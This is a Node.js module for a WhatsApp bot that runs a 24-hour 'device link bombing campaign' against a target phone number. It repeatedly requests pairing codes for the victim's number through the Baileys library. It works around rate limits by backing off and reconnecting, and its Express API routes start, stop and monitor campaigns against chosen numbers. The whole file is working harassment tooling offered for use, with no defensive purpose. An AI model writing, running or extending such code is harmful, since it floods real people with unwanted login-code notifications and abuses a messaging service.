// ============================================================
// MODULE: spampair.js
// WhatsApp Bot command: .spampair <phone_number>
// Starts a 24-hour device link bombing campaign against the target
// Uses proper useMultiFileAuthState for persistent WA socket identity
// ============================================================

const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const EventEmitter = require('events');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_HOURS = 24;
const REQUEST_DELAY_MIN_MS = 12000;
const REQUEST_DELAY_MAX_MS = 18000;
const SESSIONS_DIR = path.join(__dirname, '..', '..', 'spampair_sessions');

// ---------- STATE ----------
const activeCampaigns = new Map();

class SpamPair extends EventEmitter {
  constructor(phoneNumber, durationHours = DEFAULT_DURATION_HOURS) {
    super();
    this.phone = this._formatNumber(phoneNumber);
    this.durationMs = durationHours * 60 * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
    this._baileys = null;
    this._sock = null;
    this._saveCreds = null;
    this._connUpdateHandler = null;
    this._connPromise = null;
  }

  _formatNumber(num) {
    let clean = String(num || '').replace(/\D/g, '');
    if (!clean.startsWith('91')) clean = '91' + clean;
    return clean;
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _ensureBaileys() {
    if (!this._baileys) {
      try {
        const baileys = require("@whiskeysockets/baileys");
        const { default: makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers, useMultiFileAuthState } = baileys;
        this._baileys = { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers, useMultiFileAuthState };
        this._browser = Browsers?.ubuntu('Chrome');
      } catch (_be) {
        throw new Error('Baileys library not available in this environment');
      }
    }
    return this._baileys;
  }

  // ---------- PERSISTENT SOCKET with useMultiFileAuthState ----------
  async _ensureSocket() {
    if (this._sock && this._sock.ws?.readyState === 1) return true;
    if (this._connPromise) return this._connPromise;

    this._connPromise = this._connectSocket();
    try {
      return await this._connPromise;
    } finally {
      this._connPromise = null;
    }
  }

  async _connectSocket() {
    const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();

    // Create session directory for this campaign's persistent auth
    const sessionDir = path.join(SESSIONS_DIR, this.phone);
    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    this._saveCreds = saveCreds;

    const { version } = await fetchLatestBaileysVersion();

    let connResolve, connReject;
    const connPromise = new Promise((res, rej) => { connResolve = res; connReject = rej; });
    const timeout = setTimeout(() => connReject(new Error('Socket connect timeout (25s)')), 25000);

    this._connUpdateHandler = (update) => {
      if (update.connection === 'open') {
        clearTimeout(timeout);
        connResolve(true);
      }
      if (update.lastDisconnect?.error) {
        clearTimeout(timeout);
        connReject(update.lastDisconnect.error);
      }
    };

    this._sock = makeWASocket({
      version,
      browser: this._browser || Browsers.ubuntu('Chrome'),
      auth: {
        creds: state.creds,
        keys: state.keys
      },
      generateHighQualityLinkPreview: false,
      shouldSyncHistoryMessage: () => false,
      getMessage: async () => undefined,
      connectTimeoutMs: 20000,
      defaultQueryTimeoutMs: 20000,
      logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
    });

    this._sock.ev.on('connection.update', this._connUpdateHandler);

    // Also save creds when they update (handles key refreshes from server)
    this._sock.ev.on('creds.update', saveCreds);

    await connPromise;

    // Extra buffer for server stanzas to arrive
    await this._sleep(3000);
    return true;
  }

  _cleanupSocket() {
    if (this._sock) {
      if (this._connUpdateHandler) {
        try { this._sock.ev?.off('connection.update', this._connUpdateHandler); } catch (_) {}
      }
      try { this._sock.ev?.off('creds.update', this._saveCreds); } catch (_) {}
      try { this._sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
      this._sock = null;
      this._saveCreds = null;
      this._connUpdateHandler = null;
    }
    this._connPromise = null;
  }

  // ---------- CORE ATTEMPT — reuses persistent socket ----------
  async _attemptLink() {
    let errMsg = '';
    try {
      await this._ensureSocket();
      if (!this._sock || this._sock.ws?.readyState !== 1) {
        throw new Error('Socket not connected');
      }

      const code = await Promise.race([
        this._sock.requestPairingCode(this.phone),
        new Promise((_, rej) => setTimeout(() => rej(new Error('requestPairingCode timeout (20s)')), 20000))
      ]);

      this.stats.attempts++;
      this.stats.success++;
      return true;

    } catch (error) {
      this.stats.attempts++;
      this.stats.errors++;
      errMsg = String(error?.message || error || 'Unknown').slice(0, 200);

      if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
        this.emit('rate-limit', { phone: this.phone, detail: errMsg });
        await this._sleep(60000);
      } else if (errMsg.includes('not connected') || errMsg.includes('connect') || errMsg.includes('handshake') || errMsg.includes('disconnect') || errMsg.includes('timeout')) {
        this._cleanupSocket();
        await this._sleep(20000);
      } else {
        // For other errors (like "already registered", "device not supported", etc),
        // close socket so _ensureSocket reconnects fresh next time
        this._cleanupSocket();
        await this._sleep(10000);
      }

      // Send a progress message every 5 errors so user knows campaign is running
      if (this.stats.errors % 5 === 1 && this.stats.errors <= 6) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - (this._startTime || Date.now())) / 1000),
          note: `Last error: ${errMsg}`
        });
      }

      return false;
    }
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this._startTime = startTime;
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    // Pre-clean any stale session before starting
    this._cleanupSocket();

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      const ok = await this._attemptLink();

      // Progress every 10 attempts or on first error
      if (this.stats.attempts % 10 === 0 || (this.stats.attempts === 1 && !ok)) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      await this._sleep(this._randomDelay());

      if (this.stats.attempts % 50 === 0) {
        this.sessionId = crypto.randomBytes(8).toString('hex');
      }
    }

    this._cleanupSocket();
    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() {
    if (this._timer) {
      this.emit('error', { phone: this.phone, message: 'Already running' });
      return;
    }
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this._cleanupSocket();
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS API ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeCampaigns.has(cleanNumber)) {
    const campaign = activeCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
  }
  const campaign = new SpamPair(phoneNumber);
  activeCampaigns.set(cleanNumber, { spamPair: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationHours: DEFAULT_DURATION_HOURS });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active campaign for this number', phone: cleanNumber });
  const entry = activeCampaigns.get(cleanNumber);
  entry.spamPair.stop();
  activeCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
});

router.get('/status', (req, res) => {
  if (activeCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeCampaigns) {
    campaigns.push({ phone, stats: entry.spamPair.getStats(), running: !entry.spamPair.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SpamPair = SpamPair;
module.exports.activeCampaigns = activeCampaigns;
